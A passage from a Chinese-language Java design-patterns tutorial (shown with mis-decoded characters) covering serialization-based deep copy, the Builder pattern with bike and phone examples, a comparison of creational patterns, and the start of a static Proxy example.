ObjectOutputStream(new FileOutputStream(\"C:\\\\Users\\\\Think\\\\Desktop\\\\b.txt\"));\n        //å°†c1å¯¹è±¡å†™å‡ºåˆ°æ–‡ä»¶ä¸­\n        oos.writeObject(c1);\n        oos.close();\n\n        //åˆ›å»ºå¯¹è±¡å‡ºå…¥æµå¯¹è±¡\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"C:\\\\Users\\\\Think\\\\Desktop\\\\b.txt\"));\n        //è¯»å–å¯¹è±¡\n        Citation c2 = (Citation) ois.readObject();\n        //è·å–c2å¥–çŠ¶æ‰€å±å­¦ç”Ÿå¯¹è±¡\n        Student stu1 = c2.getStu();\n        stu1.setName(\"æå››\");\n\n        //åˆ¤æ–­stuå¯¹è±¡å’Œstu1å¯¹è±¡æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¯¹è±¡\n        System.out.println(\"stuå’Œstu1æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Ÿ\" + (stu == stu1));\n\n        c1.show();\n        c2.show();\n    }\n}\n/**\n*stuå’Œstu1æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Ÿfalse\n*å¼ ä¸‰åŒå­¦ï¼šåœ¨2020å­¦å¹´ç¬¬ä¸€å­¦æœŸä¸­è¡¨ç°ä¼˜ç§€ï¼Œè¢«è¯„ä¸ºä¸‰å¥½å­¦ç”Ÿã€‚ç‰¹å‘æ­¤çŠ¶ï¼\n*æå››åŒå­¦ï¼šåœ¨2020å­¦å¹´ç¬¬ä¸€å­¦æœŸä¸­è¡¨ç°ä¼˜ç§€ï¼Œè¢«è¯„ä¸ºä¸‰å¥½å­¦ç”Ÿã€‚ç‰¹å‘æ­¤çŠ¶ï¼\n*/\n```\n\n> æ³¨æ„ï¼šCitationç±»å’ŒStudentç±»å¿…é¡»å®ç°Serializableæ¥å£ï¼Œå¦åˆ™ä¼šæŠ›NotSerializableExceptionå¼‚å¸¸ã€‚\n\n## âºå»ºé€ è€…æ¨¡å¼\n\n### 1.ç®€è¿°\n\nå°†ä¸€ä¸ªå¤æ‚å¯¹è±¡çš„æ„å»ºä¸è¡¨ç¤ºåˆ†ç¦»ï¼Œä½¿å¾—åŒæ ·çš„æ„å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„è¡¨ç¤ºã€‚è¿™ä¸ªæ¨¡å¼é€‚ç”¨äºï¼šæŸä¸ªå¯¹è±¡çš„æ„å»ºè¿‡ç¨‹å¤æ‚çš„æƒ…å†µã€‚\n\n* åˆ†ç¦»äº†éƒ¨ä»¶çš„æ„é€ (ç”±Builderæ¥è´Ÿè´£)å’Œè£…é…(ç”±Directorè´Ÿè´£)ã€‚ ä»è€Œå¯ä»¥æ„é€ å‡ºå¤æ‚çš„å¯¹è±¡ã€‚\n* ç”±äºå®ç°äº†æ„å»ºå’Œè£…é…çš„è§£è€¦ã€‚ä¸åŒçš„æ„å»ºå™¨ï¼Œç›¸åŒçš„è£…é…ï¼Œä¹Ÿå¯ä»¥åšå‡ºä¸åŒçš„å¯¹è±¡ï¼›ç›¸åŒçš„æ„å»ºå™¨ï¼Œä¸åŒçš„è£…é…é¡ºåºä¹Ÿå¯ä»¥åšå‡ºä¸åŒçš„å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯å®ç°äº†æ„å»ºç®—æ³•ã€è£…é…ç®—æ³•çš„è§£è€¦ï¼Œå®ç°äº†æ›´å¥½çš„å¤ç”¨ã€‚\n* å»ºé€ è€…æ¨¡å¼å¯ä»¥å°†éƒ¨ä»¶å’Œå…¶ç»„è£…è¿‡ç¨‹åˆ†å¼€ï¼Œä¸€æ­¥ä¸€æ­¥åˆ›å»ºä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ã€‚ç”¨æˆ·åªéœ€è¦æŒ‡å®šå¤æ‚å¯¹è±¡çš„ç±»å‹å°±å¯ä»¥å¾—åˆ°è¯¥å¯¹è±¡ï¼Œè€Œæ— é¡»çŸ¥é“å…¶å†…éƒ¨çš„å…·ä½“æ„é€ ç»†èŠ‚ã€‚\n\nå»ºé€ è€…æ¨¡å¼åŒ…å«å¦‚ä¸‹è§’è‰²ï¼š\n\n* æŠ½è±¡å»ºé€ è€…ç±»ï¼ˆBuilderï¼‰ï¼šè¿™ä¸ªæ¥å£è§„å®šè¦å®ç°å¤æ‚å¯¹è±¡çš„é‚£äº›éƒ¨åˆ†çš„åˆ›å»ºï¼Œå¹¶ä¸æ¶‰åŠå…·ä½“éƒ¨ä»¶å¯¹è±¡çš„åˆ›å»ºã€‚\n\n* å…·ä½“å»ºé€ è€…ç±»ï¼ˆConcreteBuilderï¼‰ï¼šå®ç° Builder æ¥å£ï¼Œå®Œæˆå¤æ‚äº§å“çš„å„ä¸ªéƒ¨ä»¶çš„å…·ä½“åˆ›å»ºæ–¹æ³•ã€‚åœ¨æ„é€ è¿‡ç¨‹å®Œæˆåï¼Œæä¾›äº§å“çš„å®ä¾‹ã€‚ \n\n* äº§å“ç±»ï¼ˆProductï¼‰ï¼šè¦åˆ›å»ºçš„å¤æ‚å¯¹è±¡ã€‚\n\n* æŒ‡æŒ¥è€…ç±»ï¼ˆDirectorï¼‰ï¼šè°ƒç”¨å…·ä½“å»ºé€ è€…æ¥åˆ›å»ºå¤æ‚å¯¹è±¡çš„å„ä¸ªéƒ¨åˆ†ï¼Œåœ¨æŒ‡å¯¼è€…ä¸­ä¸æ¶‰åŠå…·ä½“äº§å“çš„ä¿¡æ¯ï¼Œåªè´Ÿè´£ä¿è¯å¯¹è±¡å„éƒ¨åˆ†å®Œæ•´åˆ›å»ºæˆ–æŒ‰æŸç§é¡ºåºåˆ›å»ºã€‚ \n\n![](https://img.jwt1399.top/img/202211112144442.png)\n\n### 2.å®ä¾‹\n\n**ã€ä¾‹ã€‘åˆ›å»ºå…±äº«å•è½¦**\n\nç”Ÿäº§è‡ªè¡Œè½¦æ˜¯ä¸€ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œå®ƒåŒ…å«äº†è½¦æ¶ï¼Œè½¦åº§ç­‰ç»„ä»¶çš„ç”Ÿäº§ã€‚è€Œè½¦æ¶åˆæœ‰ç¢³çº¤ç»´ï¼Œé“åˆé‡‘ç­‰æè´¨çš„ï¼Œè½¦åº§æœ‰æ©¡èƒ¶ï¼ŒçœŸçš®ç­‰æè´¨ã€‚å¯¹äºè‡ªè¡Œè½¦çš„ç”Ÿäº§å°±å¯ä»¥ä½¿ç”¨å»ºé€ è€…æ¨¡å¼ã€‚\n\nè¿™é‡ŒBikeæ˜¯äº§å“ï¼ŒåŒ…å«è½¦æ¶ï¼Œè½¦åº§ç­‰ç»„ä»¶ï¼›Builderæ˜¯æŠ½è±¡å»ºé€ è€…ï¼ŒMobikeBuilderå’ŒOfoBuilderæ˜¯å…·ä½“çš„å»ºé€ è€…ï¼›Directoræ˜¯æŒ‡æŒ¥è€…ã€‚ç±»å›¾å¦‚ä¸‹ï¼š\n\n![](../images/Java-è®¾è®¡æ¨¡å¼/image-20221111214538601.png)\n\nå…·ä½“çš„ä»£ç å¦‚ä¸‹ï¼š\n\n```java\n//è‡ªè¡Œè½¦ç±»\npublic class Bike {\n    private String frame;\n    private String seat;\n\n    public String getFrame() {\n        return frame;\n    }\n\n    public void setFrame(String frame) {\n        this.frame = frame;\n    }\n\n    public String getSeat() {\n        return seat;\n    }\n\n    public void setSeat(String seat) {\n        this.seat = seat;\n    }\n}\n\n// æŠ½è±¡ builder ç±»\npublic abstract class Builder {\n\n    protected Bike mBike = new Bike();\n\n    public abstract void buildFrame();\n    public abstract void buildSeat();\n    public abstract Bike createBike();\n}\n\n//æ‘©æ‹œå•è½¦Builderç±»\npublic class MobikeBuilder extends Builder {\n\n    @Override\n    public void buildFrame() {\n        mBike.setFrame(\"é“åˆé‡‘è½¦æ¶\");\n    }\n\n    @Override\n    public void buildSeat() {\n        mBike.setSeat(\"çœŸçš®è½¦åº§\");\n    }\n\n    @Override\n    public Bike createBike() {\n        return mBike;\n    }\n}\n\n//ofoå•è½¦Builderç±»\npublic class OfoBuilder extends Builder {\n\n    @Override\n    public void buildFrame() {\n        mBike.setFrame(\"ç¢³çº¤ç»´è½¦æ¶\");\n    }\n\n    @Override\n    public void buildSeat() {\n        mBike.setSeat(\"æ©¡èƒ¶è½¦åº§\");\n    }\n\n    @Override\n    public Bike createBike() {\n        return mBike;\n    }\n}\n\n//æŒ‡æŒ¥è€…ç±»\npublic class Director {\n    private Builder mBuilder;\n\n    public Director(Builder builder) {\n        mBuilder = builder;\n    }\n\n    public Bike construct() {\n        mBuilder.buildFrame();\n        mBuilder.buildSeat();\n        return mBuilder.createBike();\n    }\n}\n\n//æµ‹è¯•ç±»\npublic class Client {\n    public static void main(String[] args) {\n        showBike(new OfoBuilder());\n        showBike(new MobikeBuilder());\n    }\n    private static void showBike(Builder builder) {\n        Director director = new Director(builder);\n        Bike bike = director.construct();\n        System.out.println(bike.getFrame());\n        System.out.println(bike.getSeat());\n    }\n}\n```\n\n**æ³¨æ„ï¼š**ä¸Šé¢ç¤ºä¾‹æ˜¯ Builderæ¨¡å¼çš„å¸¸è§„ç”¨æ³•ï¼ŒæŒ‡æŒ¥è€…ç±» Director åœ¨å»ºé€ è€…æ¨¡å¼ä¸­å…·æœ‰å¾ˆé‡è¦çš„ä½œç”¨ï¼Œå®ƒç”¨äºæŒ‡å¯¼å…·ä½“æ„å»ºè€…å¦‚ä½•æ„å»ºäº§å“ï¼Œæ§åˆ¶è°ƒç”¨å…ˆåæ¬¡åºï¼Œå¹¶å‘è°ƒç”¨è€…è¿”å›å®Œæ•´çš„äº§å“ç±»ï¼Œä½†æ˜¯æœ‰äº›æƒ…å†µä¸‹éœ€è¦ç®€åŒ–ç³»ç»Ÿç»“æ„ï¼Œå¯ä»¥æŠŠæŒ‡æŒ¥è€…ç±»å’ŒæŠ½è±¡å»ºé€ è€…è¿›è¡Œç»“åˆ\n\n```java\n// æŠ½è±¡ builder ç±»\npublic abstract class Builder {\n\n    protected Bike mBike = new Bike();\n\n    public abstract void buildFrame();\n    public abstract void buildSeat();\n    public abstract Bike createBike();\n    \n    public Bike construct() {\n        this.buildFrame();\n        this.BuildSeat();\n        return this.createBike();\n    }\n}\n```\n\n**è¯´æ˜ï¼š**è¿™æ ·åšç¡®å®ç®€åŒ–äº†ç³»ç»Ÿç»“æ„ï¼Œä½†åŒæ—¶ä¹ŸåŠ é‡äº†æŠ½è±¡å»ºé€ è€…ç±»çš„èŒè´£ï¼Œä¹Ÿä¸æ˜¯å¤ªç¬¦åˆå•ä¸€èŒè´£åŸåˆ™ï¼Œå¦‚æœconstruct() è¿‡äºå¤æ‚ï¼Œå»ºè®®è¿˜æ˜¯å°è£…åˆ° Director ä¸­ã€‚\n\n**ä¼˜ç‚¹ï¼š**\n\n- å»ºé€ è€…æ¨¡å¼çš„å°è£…æ€§å¾ˆå¥½ã€‚ä½¿ç”¨å»ºé€ è€…æ¨¡å¼å¯ä»¥æœ‰æ•ˆçš„å°è£…å˜åŒ–ï¼Œåœ¨ä½¿ç”¨å»ºé€ è€…æ¨¡å¼çš„åœºæ™¯ä¸­ï¼Œä¸€èˆ¬äº§å“ç±»å’Œå»ºé€ è€…ç±»æ˜¯æ¯”è¾ƒç¨³å®šçš„ï¼Œå› æ­¤ï¼Œå°†ä¸»è¦çš„ä¸šåŠ¡é€»è¾‘å°è£…åœ¨æŒ‡æŒ¥è€…ç±»ä¸­å¯¹æ•´ä½“è€Œè¨€å¯ä»¥å–å¾—æ¯”è¾ƒå¥½çš„ç¨³å®šæ€§ã€‚\n- åœ¨å»ºé€ è€…æ¨¡å¼ä¸­ï¼Œå®¢æˆ·ç«¯ä¸å¿…çŸ¥é“äº§å“å†…éƒ¨ç»„æˆçš„ç»†èŠ‚ï¼Œå°†äº§å“æœ¬èº«ä¸äº§å“çš„åˆ›å»ºè¿‡ç¨‹è§£è€¦ï¼Œä½¿å¾—ç›¸åŒçš„åˆ›å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„äº§å“å¯¹è±¡ã€‚\n- å¯ä»¥æ›´åŠ ç²¾ç»†åœ°æ§åˆ¶äº§å“çš„åˆ›å»ºè¿‡ç¨‹ ã€‚å°†å¤æ‚äº§å“çš„åˆ›å»ºæ­¥éª¤åˆ†è§£åœ¨ä¸åŒçš„æ–¹æ³•ä¸­ï¼Œä½¿å¾—åˆ›å»ºè¿‡ç¨‹æ›´åŠ æ¸…æ™°ï¼Œä¹Ÿæ›´æ–¹ä¾¿ä½¿ç”¨ç¨‹åºæ¥æ§åˆ¶åˆ›å»ºè¿‡ç¨‹ã€‚\n- å»ºé€ è€…æ¨¡å¼å¾ˆå®¹æ˜“è¿›è¡Œæ‰©å±•ã€‚å¦‚æœæœ‰æ–°çš„éœ€æ±‚ï¼Œé€šè¿‡å®ç°ä¸€ä¸ªæ–°çš„å»ºé€ è€…ç±»å°±å¯ä»¥å®Œæˆï¼ŒåŸºæœ¬ä¸Šä¸ç”¨ä¿®æ”¹ä¹‹å‰å·²ç»æµ‹è¯•é€šè¿‡çš„ä»£ç ï¼Œå› æ­¤ä¹Ÿå°±ä¸ä¼šå¯¹åŸæœ‰åŠŸèƒ½å¼•å…¥é£é™©ã€‚ç¬¦åˆå¼€é—­åŸåˆ™ã€‚\n\n**ç¼ºç‚¹ï¼š**\n\né€ è€…æ¨¡å¼æ‰€åˆ›å»ºçš„äº§å“ä¸€èˆ¬å…·æœ‰è¾ƒå¤šçš„å…±åŒç‚¹ï¼Œå…¶ç»„æˆéƒ¨åˆ†ç›¸ä¼¼ï¼Œå¦‚æœäº§å“ä¹‹é—´çš„å·®å¼‚æ€§å¾ˆå¤§ï¼Œåˆ™ä¸é€‚åˆä½¿ç”¨å»ºé€ è€…æ¨¡å¼ï¼Œå› æ­¤å…¶ä½¿ç”¨èŒƒå›´å—åˆ°ä¸€å®šçš„é™åˆ¶ã€‚\n\n**ä½¿ç”¨åœºæ™¯ï¼š**\n\nå»ºé€ è€…ï¼ˆBuilderï¼‰æ¨¡å¼åˆ›å»ºçš„æ˜¯å¤æ‚å¯¹è±¡ï¼Œå…¶äº§å“çš„å„ä¸ªéƒ¨åˆ†ç»å¸¸é¢ä¸´ç€å‰§çƒˆçš„å˜åŒ–ï¼Œä½†å°†å®ƒä»¬ç»„åˆåœ¨ä¸€èµ·çš„ç®—æ³•å´ç›¸å¯¹ç¨³å®šï¼Œæ‰€ä»¥å®ƒé€šå¸¸åœ¨ä»¥ä¸‹åœºåˆä½¿ç”¨ã€‚\n\n- åˆ›å»ºçš„å¯¹è±¡è¾ƒå¤æ‚ï¼Œç”±å¤šä¸ªéƒ¨ä»¶æ„æˆï¼Œå„éƒ¨ä»¶é¢ä¸´ç€å¤æ‚çš„å˜åŒ–ï¼Œä½†æ„ä»¶é—´çš„å»ºé€ é¡ºåºæ˜¯ç¨³å®šçš„ã€‚\n- åˆ›å»ºå¯¹è±¡çš„ç®—æ³•ç‹¬ç«‹äºè¯¥å¯¹è±¡çš„ç»„æˆéƒ¨åˆ†ä»¥åŠå®ƒä»¬çš„è£…é…æ–¹å¼ï¼Œå³äº§å“çš„æ„å»ºè¿‡ç¨‹å’Œæœ€ç»ˆçš„è¡¨ç¤ºæ˜¯ç‹¬ç«‹çš„ã€‚\n\n### 3.æ¨¡å¼æ‰©å±•ï¼šé“¾å¼ç¼–ç¨‹\n\nå»ºé€ è€…æ¨¡å¼é™¤äº†ä¸Šé¢çš„ç”¨é€”å¤–ï¼Œåœ¨å¼€å‘ä¸­è¿˜æœ‰ä¸€ä¸ªå¸¸ç”¨çš„ä½¿ç”¨æ–¹å¼ï¼Œå°±æ˜¯å½“ä¸€ä¸ªç±»æ„é€ å™¨éœ€è¦ä¼ å…¥å¾ˆå¤šå‚æ•°æ—¶ï¼Œå¦‚æœåˆ›å»ºè¿™ä¸ªç±»çš„å®ä¾‹ï¼Œä»£ç å¯è¯»æ€§ä¼šéå¸¸å·®ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å¼•å…¥é”™è¯¯ï¼Œæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨å»ºé€ è€…æ¨¡å¼è¿›è¡Œé‡æ„ã€‚\n\né‡æ„å‰ä»£ç å¦‚ä¸‹ï¼š\n\n```java\npublic class Phone {\n    private String cpu;\n    private String screen;\n    private String memory;\n    private String mainboard;\n\n    public Phone(String cpu, String screen, String memory, String mainboard) {\n        this.cpu = cpu;\n        this.screen = screen;\n        this.memory = memory;\n        this.mainboard = mainboard;\n    }\n\n    public String getCpu() {\n        return cpu;\n    }\n\n    public void setCpu(String cpu) {\n        this.cpu = cpu;\n    }\n\n    public String getScreen() {\n        return screen;\n    }\n\n    public void setScreen(String screen) {\n        this.screen = screen;\n    }\n\n    public String getMemory() {\n        return memory;\n    }\n\n    public void setMemory(String memory) {\n        this.memory = memory;\n    }\n\n    public String getMainboard() {\n        return mainboard;\n    }\n\n    public void setMainboard(String mainboard) {\n        this.mainboard = mainboard;\n    }\n\n    @Override\n    public String toString() {\n        return \"Phone{\" +\n                \"cpu='\" + cpu + '\\'' +\n                \", screen='\" + screen + '\\'' +\n                \", memory='\" + memory + '\\'' +\n                \", mainboard='\" + mainboard + '\\'' +\n                '}';\n    }\n}\n\npublic class Client {\n    public static void main(String[] args) {\n        //æ„å»ºPhoneå¯¹è±¡\n        Phone phone = new Phone(\"intel\",\"ä¸‰æ˜Ÿå±å¹•\",\"é‡‘å£«é¡¿\",\"åç¡•\");\n        System.out.println(phone);\n    }\n}\n```\n\næ„å»ºPhoneå¯¹è±¡ï¼Œä¼ é€’äº†å››ä¸ªå‚æ•°ï¼Œå¦‚æœå‚æ•°æ›´å¤šå‘¢ï¼Ÿä»£ç çš„å¯è¯»æ€§åŠä½¿ç”¨çš„æˆæœ¬å°±æ˜¯æ¯”è¾ƒé«˜ã€‚\n\né‡æ„åä»£ç ï¼š\n\n> lombokä¸­@Builderæ³¨è§£å¯å®ç°ç±»ä¼¼åŠŸèƒ½ï¼ˆé“¾å¼ç¼–ç¨‹ï¼‰\n\n```java\npublic class Phone {\n\n    private String cpu;\n    private String screen;\n    private String memory;\n    private String mainboard;\n\n    private Phone(Builder builder) {\n        cpu = builder.cpu;\n        screen = builder.screen;\n        memory = builder.memory;\n        mainboard = builder.mainboard;\n    }\n\n    public static final class Builder {\n        private String cpu;\n        private String screen;\n        private String memory;\n        private String mainboard;\n\n        public Builder() {}\n\n        public Builder cpu(String val) {\n            cpu = val;\n            return this;\n        }\n        public Builder screen(String val) {\n            screen = val;\n            return this;\n        }\n        public Builder memory(String val) {\n            memory = val;\n            return this;\n        }\n        public Builder mainboard(String val) {\n            mainboard = val;\n            return this;\n        }\n        public Phone build() {\n            return new Phone(this);}\n    }\n    @Override\n    public String toString() {\n        return \"Phone{\" +\n                \"cpu='\" + cpu + '\\'' +\n                \", screen='\" + screen + '\\'' +\n                \", memory='\" + memory + '\\'' +\n                \", mainboard='\" + mainboard + '\\'' +\n                '}';\n    }\n}\n\npublic class Client {\n    public static void main(String[] args) {\n        Phone phone = new Phone.Builder()\n                .cpu(\"intel\")\n                .mainboard(\"åç¡•\")\n                .memory(\"é‡‘å£«é¡¿\")\n                .screen(\"ä¸‰æ˜Ÿ\")\n                .build();\n        System.out.println(phone);\n    }\n}\n```\n\né‡æ„åçš„ä»£ç åœ¨ä½¿ç”¨èµ·æ¥æ›´æ–¹ä¾¿ï¼ŒæŸç§ç¨‹åº¦ä¸Šä¹Ÿå¯ä»¥æé«˜å¼€å‘æ•ˆç‡ã€‚ä»è½¯ä»¶è®¾è®¡ä¸Šï¼Œå¯¹ç¨‹åºå‘˜çš„è¦æ±‚æ¯”è¾ƒé«˜ã€‚\n\n## â»åˆ›å»ºå‹æ¨¡å¼å¯¹æ¯”\n\n### 1.å·¥å‚æ–¹æ³•æ¨¡å¼VSå»ºé€ è€…æ¨¡å¼\n\nå·¥å‚æ–¹æ³•æ¨¡å¼æ³¨é‡çš„æ˜¯æ•´ä½“å¯¹è±¡çš„åˆ›å»ºæ–¹å¼ï¼›è€Œå»ºé€ è€…æ¨¡å¼æ³¨é‡çš„æ˜¯éƒ¨ä»¶æ„å»ºçš„è¿‡ç¨‹ï¼Œæ„åœ¨é€šè¿‡ä¸€æ­¥ä¸€æ­¥åœ°ç²¾ç¡®æ„é€ åˆ›å»ºå‡ºä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ã€‚\n\næˆ‘ä»¬ä¸¾ä¸ªç®€å•ä¾‹å­æ¥è¯´æ˜ä¸¤è€…çš„å·®å¼‚ï¼Œå¦‚è¦åˆ¶é€ ä¸€ä¸ªè¶…äººï¼Œå¦‚æœä½¿ç”¨å·¥å‚æ–¹æ³•æ¨¡å¼ï¼Œç›´æ¥äº§ç”Ÿå‡ºæ¥çš„å°±æ˜¯ä¸€ä¸ªåŠ›å¤§æ— ç©·ã€èƒ½å¤Ÿé£ç¿”ã€å†…è£¤å¤–ç©¿çš„è¶…äººï¼›è€Œå¦‚æœä½¿ç”¨å»ºé€ è€…æ¨¡å¼ï¼Œåˆ™éœ€è¦ç»„è£…æ‰‹ã€å¤´ã€è„šã€èº¯å¹²ç­‰éƒ¨åˆ†ï¼Œç„¶åå†æŠŠå†…è£¤å¤–ç©¿ï¼Œäºæ˜¯ä¸€ä¸ªè¶…äººå°±è¯ç”Ÿäº†ã€‚\n\n### 2.æŠ½è±¡å·¥å‚æ¨¡å¼VSå»ºé€ è€…æ¨¡å¼\n\næŠ½è±¡å·¥å‚æ¨¡å¼å®ç°å¯¹äº§å“å®¶æ—çš„åˆ›å»ºï¼Œä¸€ä¸ªäº§å“å®¶æ—æ˜¯è¿™æ ·çš„ä¸€ç³»åˆ—äº§å“ï¼šå…·æœ‰ä¸åŒåˆ†ç±»ç»´åº¦çš„äº§å“ç»„åˆï¼Œé‡‡ç”¨æŠ½è±¡å·¥å‚æ¨¡å¼åˆ™æ˜¯ä¸éœ€è¦å…³å¿ƒæ„å»ºè¿‡ç¨‹ï¼Œåªå…³å¿ƒä»€ä¹ˆäº§å“ç”±ä»€ä¹ˆå·¥å‚ç”Ÿäº§å³å¯ã€‚\n\nå»ºé€ è€…æ¨¡å¼åˆ™æ˜¯è¦æ±‚æŒ‰ç…§æŒ‡å®šçš„è“å›¾å»ºé€ äº§å“ï¼Œå®ƒçš„ä¸»è¦ç›®çš„æ˜¯é€šè¿‡ç»„è£…é›¶é…ä»¶è€Œäº§ç”Ÿä¸€ä¸ªæ–°äº§å“ã€‚\n\nå¦‚æœå°†æŠ½è±¡å·¥å‚æ¨¡å¼çœ‹æˆæ±½è½¦é…ä»¶ç”Ÿäº§å·¥å‚ï¼Œç”Ÿäº§ä¸€ä¸ªäº§å“æ—çš„äº§å“ï¼Œé‚£ä¹ˆå»ºé€ è€…æ¨¡å¼å°±æ˜¯ä¸€ä¸ªæ±½è½¦ç»„è£…å·¥å‚ï¼Œé€šè¿‡å¯¹éƒ¨ä»¶çš„ç»„è£…å¯ä»¥è¿”å›ä¸€è¾†å®Œæ•´çš„æ±½è½¦ã€‚\n\n# â‘¡ç»“æ„å‹æ¨¡å¼-7ç§\n\n> ç»“æ„å‹æ¨¡å¼æè¿°å¦‚ä½•å°†ç±»æˆ–å¯¹è±¡æŒ‰æŸç§å¸ƒå±€ç»„æˆæ›´å¤§çš„ç»“æ„ã€‚åˆ†ä¸ºç±»ç»“æ„å‹æ¨¡å¼å’Œå¯¹è±¡ç»“æ„å‹æ¨¡å¼ï¼Œå‰è€…é‡‡ç”¨ç»§æ‰¿æœºåˆ¶æ¥ç»„ç»‡æ¥å£å’Œç±»ï¼Œåè€…é‡†ç”¨ç»„åˆæˆ–èšåˆæ¥ç»„åˆå¯¹è±¡ã€‚\n>\n> ç”±äºç»„åˆå…³ç³»æˆ–èšåˆå…³ç³»æ¯”ç»§æ‰¿å…³ç³»è€¦åˆåº¦ä½ï¼Œæ»¡è¶³â€œåˆæˆå¤ç”¨åŸåˆ™â€ï¼Œæ‰€ä»¥å¯¹è±¡ç»“æ„å‹æ¨¡å¼æ¯”ç±»ç»“æ„å‹æ¨¡å¼å…·æœ‰æ›´å¤§çš„çµæ´»æ€§ã€‚\n\n## â¶ä»£ç†æ¨¡å¼\n\n### 0.ç®€è¿°\n\nç”±äºæŸäº›åŸå› éœ€è¦ç»™æŸå¯¹è±¡æä¾›ä¸€ä¸ªä»£ç†ä»¥æ§åˆ¶å¯¹è¯¥å¯¹è±¡çš„è®¿é—®ã€‚è¿™æ—¶ï¼Œè®¿é—®å¯¹è±¡ä¸é€‚åˆæˆ–è€…ä¸èƒ½ç›´æ¥å¼•ç”¨ç›®æ ‡å¯¹è±¡ï¼Œä»£ç†å¯¹è±¡ä½œä¸ºè®¿é—®å¯¹è±¡å’Œç›®æ ‡å¯¹è±¡ä¹‹é—´çš„ä¸­ä»‹ã€‚\n\nJavaä¸­çš„ä»£ç†æŒ‰ç…§ä»£ç†ç±»ç”Ÿæˆæ—¶æœºä¸åŒåˆåˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ã€‚\n\n- é™æ€ä»£ç†ä»£ç†ç±»åœ¨**ç¼–è¯‘æœŸå°±ç”Ÿæˆ**\n- åŠ¨æ€ä»£ç†ä»£ç†ç±»åˆ™æ˜¯åœ¨**Javaè¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆ**ã€‚\n  - åŠ¨æ€ä»£ç†åˆæœ‰**JDKä»£ç†**å’Œ**CGLibä»£ç†**ä¸¤ç§ã€‚\n\nä»£ç†ï¼ˆProxyï¼‰æ¨¡å¼åˆ†ä¸ºä¸‰ç§è§’è‰²ï¼š\n\n* æŠ½è±¡ä¸»é¢˜ï¼ˆSubjectï¼‰ç±»ï¼š é€šè¿‡æ¥å£æˆ–æŠ½è±¡ç±»å£°æ˜çœŸå®ä¸»é¢˜å’Œä»£ç†å¯¹è±¡å®ç°çš„ä¸šåŠ¡æ–¹æ³•ã€‚\n* çœŸå®ä¸»é¢˜ï¼ˆReal Subjectï¼‰ç±»ï¼š å®ç°äº†æŠ½è±¡ä¸»é¢˜ä¸­çš„å…·ä½“ä¸šåŠ¡ï¼Œæ˜¯ä»£ç†å¯¹è±¡æ‰€ä»£è¡¨çš„çœŸå®å¯¹è±¡ï¼Œæ˜¯æœ€ç»ˆè¦å¼•ç”¨çš„å¯¹è±¡ã€‚\n* ä»£ç†ï¼ˆProxyï¼‰ç±» ï¼š æä¾›äº†ä¸çœŸå®ä¸»é¢˜ç›¸åŒçš„æ¥å£ï¼Œå…¶å†…éƒ¨å«æœ‰å¯¹çœŸå®ä¸»é¢˜çš„å¼•ç”¨ï¼Œå®ƒå¯ä»¥è®¿é—®ã€æ§åˆ¶æˆ–æ‰©å±•çœŸå®ä¸»é¢˜çš„åŠŸèƒ½ã€‚\n\n### 1.é™æ€ä»£ç†\n\nã€ä¾‹ã€‘ç«è½¦ç«™å–ç¥¨\n\nå¦‚æœè¦ä¹°ç«è½¦ç¥¨çš„è¯ï¼Œéœ€è¦å»ç«è½¦ç«™ä¹°ç¥¨ï¼Œåè½¦åˆ°ç«è½¦ç«™ï¼Œæ’é˜Ÿç­‰ä¸€ç³»åˆ—çš„æ“ä½œï¼Œæ˜¾ç„¶æ¯”è¾ƒéº»çƒ¦ã€‚è€Œç«è½¦ç«™åœ¨å¤šä¸ªåœ°æ–¹éƒ½æœ‰ä»£å”®ç‚¹ï¼Œæˆ‘ä»¬å»ä»£å”®ç‚¹ä¹°ç¥¨å°±æ–¹ä¾¿å¾ˆå¤šäº†ã€‚è¿™ä¸ªä¾‹å­å…¶å®å°±æ˜¯å…¸å‹çš„ä»£ç†æ¨¡å¼ï¼Œç«è½¦ç«™æ˜¯ç›®æ ‡å¯¹è±¡ï¼Œä»£å”®ç‚¹æ˜¯ä»£ç†å¯¹è±¡ã€‚ç±»å›¾å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202211121627835.png)\n\n```java\n//å–ç¥¨æ¥å£\npublic interface SellTickets {\n    void sell();\n}\n\n//ç«è½¦ç«™  ç«è½¦ç«™å…·æœ‰å–ç¥¨åŠŸèƒ½ï¼Œæ‰€ä»¥éœ€è¦å®ç°SellTicketsæ¥å£\npublic class TrainStation implements SellTickets {\n\n    public void sell() {\n        System.out.println(\"ç«è½¦ç«™å–ç¥¨\");\n    }\n}\n\n//ä»£å”®ç‚¹\npublic class ProxyPoint implements SellTickets {\n\n    private TrainStation station = new TrainStation();\n\n    public void sell() {\n        System.out.println(\"ä»£ç†ç‚¹æ”¶å–ä¸€äº›æœåŠ¡è´¹ç”¨\");\n        station.sell();\n    }\n}\n\n//æµ‹è¯•ç±»\npublic class Client {\n    public static void main(String[] args) {\n        ProxyPoint pp = new ProxyPoint();\n        pp.sell();\n    }\n}\n```\n\nä»ä¸Šé¢ä»£ç ä¸­å¯ä»¥çœ‹å‡ºæµ‹è¯•ç±»ç›´æ¥è®¿é—®çš„æ˜¯ProxyPointç±»å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´ProxyPointä½œä¸ºè®¿é—®å¯¹è±¡å’Œç›®æ ‡å¯¹è±¡çš„ä¸­ä»‹ã€‚åŒæ—¶ä¹Ÿå¯¹sellæ–¹æ³•è¿›è¡Œäº†å¢å¼ºï¼ˆä»£ç†ç‚¹æ”¶å–ä¸€äº›æœåŠ¡è´¹ç”¨ï¼‰ã€‚\n\n### 